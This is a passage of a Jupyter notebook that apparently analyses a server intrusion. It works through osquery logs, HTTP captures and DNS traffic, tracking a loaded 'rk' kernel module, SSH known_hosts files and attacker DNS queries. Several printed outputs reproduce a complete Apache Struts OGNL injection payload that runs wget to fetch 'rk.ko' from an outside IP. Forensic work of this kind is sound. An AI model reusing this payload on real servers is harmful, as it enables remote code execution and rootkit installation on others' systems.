       "      <td>...</td>\n",
       "      <td>0d4f52b9dacac07cf2316d1686cc707c</td>\n",
       "      <td>0644</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>cffc9b8ead76006419975c0d22ba49d5fdf001a0</td>\n",
       "      <td>43d11069f7682e63289f38d184e4193f7486502f099250...</td>\n",
       "      <td>4096</td>\n",
       "      <td>\\/etc\\/osquery\\/.osquery.conf.swp</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>\\/etc\\/osquery\\/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>3 rows × 27 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                   name hostIdentifier                  calendarTime  \\\n",
       "0           system_info         ubuntu  Tue Feb  6 00:33:05 2018 UTC   \n",
       "1  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "2  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "\n",
       "     unixTime epoch counter action                 decorations.host_uuid  \\\n",
       "0  1517877185     0   38463  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "1  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "2  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "  decorations.username columns.name  ...                       columns.md5  \\\n",
       "0                 root           rk  ...                               NaN   \n",
       "1                 root          NaN  ...  0d4f52b9dacac07cf2316d1686cc707c   \n",
       "2                 root          NaN  ...                                     \n",
       "\n",
       "  columns.mode columns.mtime                              columns.sha1  \\\n",
       "0          NaN           NaN                                       NaN   \n",
       "1         0644    1517877228  cffc9b8ead76006419975c0d22ba49d5fdf001a0   \n",
       "2                                                                        \n",
       "\n",
       "                                      columns.sha256 columns.size  \\\n",
       "0                                                NaN          NaN   \n",
       "1  43d11069f7682e63289f38d184e4193f7486502f099250...         4096   \n",
       "2                                                                   \n",
       "\n",
       "                 columns.target_path columns.time columns.transaction_id  \\\n",
       "0                                NaN          NaN                    NaN   \n",
       "1  \\/etc\\/osquery\\/.osquery.conf.swp   1517877228                      0   \n",
       "2  \\/etc\\/osquery\\/.osquery.conf.swx   1517877228                      0   \n",
       "\n",
       "  columns.uid  \n",
       "0         NaN  \n",
       "1           0  \n",
       "2              \n",
       "\n",
       "[3 rows x 27 columns]"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "osquery_df.head(3)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>action</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>unixTime</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>42</th>\n",
       "      <td>added</td>\n",
       "      <td>rk</td>\n",
       "      <td>1517877249</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>43</th>\n",
       "      <td>added</td>\n",
       "      <td>ipt_MASQUERADE</td>\n",
       "      <td>1517877249</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   action    columns.name    unixTime\n",
       "42  added              rk  1517877249\n",
       "43  added  ipt_MASQUERADE  1517877249"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "kernel_names_df = osquery_df[['action','columns.name','unixTime']][osquery_df['name'] == 'kernel_module']\n",
    "kernel_names_df.head(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "1521395109.142614\n",
      "\n",
      "\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "1521395122.848523\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "index_wget = content_type_df[content_type_df['content_type'].str.contains('wget')].index\n",
    "for idx in index_wget:\n",
    "    print(content_type_df['content_type'].loc[idx])\n",
    "    print(content_type_df['timestamp'].loc[idx])\n",
    "    print(\"\\n\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 'rk.ko' is the attacker-controlled module"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>action</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>unixTime</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>42</th>\n",
       "      <td>added</td>\n",
       "      <td>rk</td>\n",
       "      <td>1517877249</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>113</th>\n",
       "      <td>removed</td>\n",
       "      <td>rk</td>\n",
       "      <td>1517877290</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2882</th>\n",
       "      <td>added</td>\n",
       "      <td>rk</td>\n",
       "      <td>1521475134</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2883</th>\n",
       "      <td>removed</td>\n",
       "      <td>rk</td>\n",
       "      <td>1521475138</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       action columns.name    unixTime\n",
       "42      added           rk  1517877249\n",
       "113   removed           rk  1517877290\n",
       "2882    added           rk  1521475134\n",
       "2883  removed           rk  1521475138"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "kernel_names_df[kernel_names_df['columns.name'] == 'rk']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### I am not sure if the kernel mode is loaded onto the server right now. It looks like the request to add the kernel (via wget command) occured last at 1521395122 secs. But the above dataframe shows that the kernel was added at 1521475134 secs and then removed at 1521475138 sec."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## (2) Internal Hostnames"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['\\\\/tmp\\\\/ssh-UOH7XgvEzl', '\\\\/tmp\\\\/ssh-5HeCi8vrsT',\n",
       "       '\\\\/tmp\\\\/ssh-LPI0zn9obc', '\\\\/tmp\\\\/ssh-Zt0dvMz9jJ',\n",
       "       '\\\\/tmp\\\\/ssh-gT0GqBhEgT', '\\\\/tmp\\\\/ssh-SjdvHQJFt5',\n",
       "       '\\\\/root\\\\/.ssh\\\\/id_rsa', '\\\\/root\\\\/.ssh\\\\/id_rsa.pub',\n",
       "       '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       "       '\\\\/root\\\\/.ssh\\\\/.known_hosts.swp',\n",
       "       '\\\\/root\\\\/.ssh\\\\/.known_hosts.swpx', '\\\\/root\\\\/.ssh\\\\/4913',\n",
       "       '\\\\/root\\\\/.ssh\\\\/known_hosts~'], dtype=object)"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "osquery_df['columns.target_path'].dropna()[osquery_df['columns.target_path'].dropna().str.contains(\".ssh\")].unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### \"\\\\/root\\\\/.ssh\\\\/known_hosts\" contains the list of hostnames"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## (3) Naive Attacker or Not? "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Not Naive\n"
     ]
    }
   ],
   "source": [
    "flag = 0\n",
    "for pkt in http:\n",
    "    try:\n",
    "        if \"known_hosts\" in pkt.http.content_type:\n",
    "            flag = 1\n",
    "    except:\n",
    "        None\n",
    "\n",
    "if flag == 0:\n",
    "    print(\"Not Naive\")\n",
    "else:\n",
    "    print(\"Naive\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 1 DNS Traffic Analysis (Attack Stages 6-7)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "539\n",
      "\n",
      "\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "551\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "i = 0\n",
    "for x in http:\n",
    "    try:\n",
    "        if \"wget\" in x.http.content_type:\n",
    "            print(x.http.content_type)\n",
    "            print(i)\n",
    "            print(\"\\n\")\n",
    "    except:\n",
    "        None\n",
    "    i+=1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### By visual inspection, we can see that wget command queries the 162.212.156.148 IP address, which suggests that this is the IP address of the attacker DNS Server"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(array(['162.212.156.148', '10.0.2.15', '75.75.75.75'], dtype=object),\n",
       " array(['10.0.2.15', '162.212.156.148', '75.75.75.75'], dtype=object))"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dns_df['ip_dst'].unique(), dns_df['ip_src'].unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Since the IP of the Attacker DNS is: 162.212.156.148, and 75.75.75.75 is the Comcast DNS server, therefore, 10.0.2.15 is the server DNS."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1440x504 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.subplots(figsize=(20, 7))\n",
    "\n",
    "plt.hist(dns_df['query_length'][dns_df['ip_src'] == '10.0.2.15'], alpha = 0.5, label = 'Server DNS', bins = 40)\n",
    "plt.hist(dns_df['query_length'][dns_df['ip_src'] == '162.212.156.148'], alpha = 0.5, label = 'Attacker DNS', bins =40)\n",
    "plt.legend()\n",
    "plt.ylabel('Number of Queries', size = 20)\n",
    "plt.title('Histogram: Length of Queries (emerging from server)', size =20)\n",
    "plt.xlabel('Length of Query', size = 30)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1440x504 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.subplots(figsize=(20, 7))\n",
    "\n",
    "plt.hist(dns_df['query_length'][dns_df['ip_dst'] == '10.0.2.15'], alpha = 0.5, label = 'Server DNS', bins = 50)\n",
    "plt.hist(dns_df['query_length'][dns_df['ip_dst'] == '162.212.156.148'], alpha = 0.5, label = 'Attacker DNS', bins =50)\n",
    "plt.legend()\n",
    "plt.ylabel('Number of Queries', size = 20)\n",
    "plt.title('Histogram: Length of Queries (going to server)', size =20)\n",
    "plt.xlabel('Length of Query', size = 30)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
